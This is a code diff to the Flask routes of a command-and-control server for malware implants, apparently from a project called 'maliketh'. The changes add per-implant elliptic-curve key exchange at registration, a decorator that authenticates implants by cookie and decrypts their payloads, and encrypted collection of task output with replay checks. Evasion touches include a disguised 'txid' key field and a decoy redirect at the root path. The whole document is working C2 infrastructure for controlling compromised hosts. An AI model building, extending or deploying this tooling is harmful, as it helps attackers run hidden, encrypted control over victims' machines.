@@ -1,62 +1,97 @@
 from datetime import datetime
-from typing import Callable
-from flask import Blueprint, jsonify, redirect, request
+from typing import Callable, Dict, Optional, Union, cast
+from flask import Blueprint, jsonify, make_response, redirect, request
 from maliketh.db import db
 import maliketh.crypto.aes
 from maliketh.models import *
 from functools import wraps
-from maliketh.config import ROUTES
-from maliketh.crypto.aes import GCM
+from maliketh.config import (
+    get_c2_route,
+    get_c2_route_methods,
+    get_c2_server_option,
+    C2_BASE_PATH,
+)
+from maliketh.crypto.ec import generate_ecc_keypair, encrypt, load_pubkey, load_privkey, decrypt_b64
 from maliketh.logging.standard_logger import StandardLogger, LogLevel
+from nacl.encoding import Base64Encoder
 import base64
 
 logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
-c2 = Blueprint("c2", __name__, url_prefix=ROUTES["c2"]["base_path"])
-
+c2 = Blueprint("c2", __name__, url_prefix=C2_BASE_PATH)
 
 def implant_authenticated(func: Callable):
     """
-    Decorator to check if the request is authenticated.
+    Check if the implant is authenticated. If so, set the request's body as the decrypted data.
+    Does not apply to the registration endpoint.
     """
 
     @wraps(func)
     def wrapper(*args, **kwargs):
-        # TODO
-        return func(*args, **kwargs)
+
+        if request.endpoint == get_c2_route("register"):
+            return
+        
+        imp_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
+        if imp_id is None:
+            return "Invalid cookie", 401
+        
+        implant = Implant.query.filter_by(implant_id=imp_id).first()
+        if implant is None:
+            return "Implant doesn't exist", 401
+
+        # Decrypt the request body
+        try:
+            if request.data is not None:
+                print(request.get_data())
+                raw_decrypted = decrypt_b64(implant.implant_pk, implant.server_sk, request.get_data())
+                decrypted = json.loads(raw_decrypted)
+            else:
+                decrypted = {}
+
+            return func(*args, **kwargs, decrypted_body=decrypted)
+        except Exception as e:
+            logger.error(f"Failed to decrypt request body: {e}")
+            return "Failed to decrypt", 401
 
     return wrapper
 
 
 @c2.route("/")
 def hello_c2():
-    return redirect("https://google.com")
+    return redirect(get_c2_server_option("redirect_url"))
 
 
-@c2.route(ROUTES["c2"]["register"]["path"], methods=ROUTES["c2"]["register"]["methods"])
+@c2.route(get_c2_route("register"), methods=get_c2_route_methods("register"))
 def register():
     # /register
-    # Body :
-    # {
-    #   "u": "username",
-    #   "t": "base64 encoded token"
-    # }
+    # Read implant public key from body
+    """
+    {
+        "txid": "b64_key_here",
+    }
+    """
 
     if request.json is None:
         return "Unauthorized", 401
 
-    try:
-        u = request.json["u"]
-        t = request.json["t"]
-    except Exception as e:
-        return "Unauthorized", 401
+    # Get the implant public key
+    implant_public_key_b64 = request.json["txid"]
 
-    if len(u) > 128:
-        return "Unauthorized", 401
-
+    # Check if it's base64
     try:
-        base64.b64decode(t)
+        base64.b64decode(implant_public_key_b64)
+        implant_public_key = load_pubkey(implant_public_key_b64)
     except:
+        logger.error(f"Failed to load implant public key: {implant_public_key_b64}")
         return "Unauthorized", 401
+
+    # Check if the implant is already registered (via public key)
+    if Implant.query.filter_by(implant_pk=implant_public_key_b64).first() is not None:
+        return "Unauthorized", 401
+
+    sk, pk = generate_ecc_keypair()  # Each implant will have a unique server public key
+    sk_b64 = sk.encode(encoder=Base64Encoder).decode("utf-8")
+    pk_b64 = pk.encode(encoder=Base64Encoder).decode("utf-8")
 
     # Create a new implant and add it to the db
     implant = Implant(
@@ -65,9 +100,9 @@ def register():
         ip=request.remote_addr,
         os=request.user_agent.platform,
         arch=request.user_agent.platform,
-        user=u,
-        aes_key=GCM.gen_key_b64(),
-        aes_aad=t,
+        user="",
+        server_sk=sk_b64,
+        implant_pk=implant_public_key_b64,
         created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     )
@@ -77,30 +112,39 @@ def register():
 
     # Create default config
     config = ImplantConfig.create_min_config(
-        implant_id=implant.implant_id, cookie=ROUTES["c2"]["implant_id_cookie"]
+        implant_id=implant.implant_id,
+        cookie=get_c2_server_option("implant_id_cookie"),
+        b64_server_pub=pk_b64,
     )
+
+    resp_body = json.dumps(
+        {
+            "status": True,
+            "id": implant.implant_id,
+            "config": config.toJSON(),
+        }
+    ).encode("utf-8")
+    resp_body = encrypt(implant_public_key, sk, resp_body)
 
     resp = jsonify(
         {
             "status": True,
-            "id": implant.implant_id,
-            "key": implant.aes_key,
-            "aad": implant.aes_aad,
-            "config": config.toJSON(),
+            "k": pk_b64,
+            "c": resp_body.decode("utf-8"),
         }
     )
     resp.status_code = 200
 
     # Set cookie to implant ID
-    resp.set_cookie(ROUTES["c2"]["implant_id_cookie"], implant.implant_id)
+    resp.set_cookie(get_c2_server_option("implant_id_cookie"), implant.implant_id)
 
     return resp
 
 
-@c2.route(ROUTES["c2"]["checkin"]["path"], methods=ROUTES["c2"]["checkin"]["methods"])
+@c2.route(get_c2_route("checkin"), methods=get_c2_route_methods("checkin"))
 def get_task():
     # Get implant id from cookie
-    implant_id = request.cookies.get(ROUTES["c2"]["implant_id_cookie"])
+    implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
 
     if implant_id is None:
         return "Not Found", 404
@@ -123,18 +167,32 @@ def get_task():
     return jsonify({})
 
 
-@c2.route(
-    ROUTES["c2"]["task_results"]["path"],
-    methods=ROUTES["c2"]["task_results"]["methods"],
-)
-def post_task(tid: str):
+@c2.route(get_c2_route("task_results"), methods=get_c2_route_methods("task_results")) # type: ignore
+@implant_authenticated
+def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]]=None):
     """
-    Get the output of a task and mark it as completed"""
-    # Get implant id from cookie
-    implant_id = request.cookies.get(ROUTES["c2"]["implant_id_cookie"])
+    Get the output of a task and mark it as completed.
+    
+    Example request body (decrypted):
+    {
+        "status": bool,
+        "tid": "task_id_here",
+        "output": "b64_output_here",
+    }
+    """
+    if decrypted_body is None:
+        return "Unauthorized", 401
 
-    if implant_id is None or tid is None:
-        return "Not Found", 404
+    if not verify_post_task_body(decrypted_body):
+        return "Unauthorized", 401
+
+    # Get implant id from cookie
+    implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
+
+    if implant_id is None :
+        return "Unauthorized", 404
+
+    tid = cast(str, decrypted_body['tid'])
 
     # Check if implant ID exists, if not, throw 404
     implant = get_implant_by_id(implant_id)
@@ -147,11 +205,18 @@ def post_task(tid: str):
     task = get_task_by_id(tid)
     # If task is not None, return task
     if task is not None:
-        # Get output from request
-        output = request.data
-        # Update task in db
-        task.output = output
-        task.status = COMPLETE
+        
+        if task.status != TASKED:
+            print("Task is not tasked, possible replay attack")
+            return "Unauthorized", 401
+
+        if decrypted_body['status']:
+            task.status = COMPLETE
+            task.output = decrypted_body['output']
+        else:
+            task.status = ERROR
+            task.output = decrypted_body['output']
+        
         task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         db.session.commit()
 
@@ -160,3 +225,21 @@ def post_task(tid: str):
         return "OK"
     # If task is None, return empty task
     return "Not Found", 404
+
+def verify_post_task_body(body: Dict[str, Union[str, bool]]) -> bool:
+    """
+    Verify that the body of the post_task request is valid.
+    """
+
+    if len(set(["status", "tid", "output"]).intersection(set(body.keys()))) != 3:
+        return False
+
+    if type(body['status']) != bool:
+        return False
+
+    if type(body['tid']) != str:
+        return False
+
+    if type(body['output']) != str:
+        return False 
+    return True
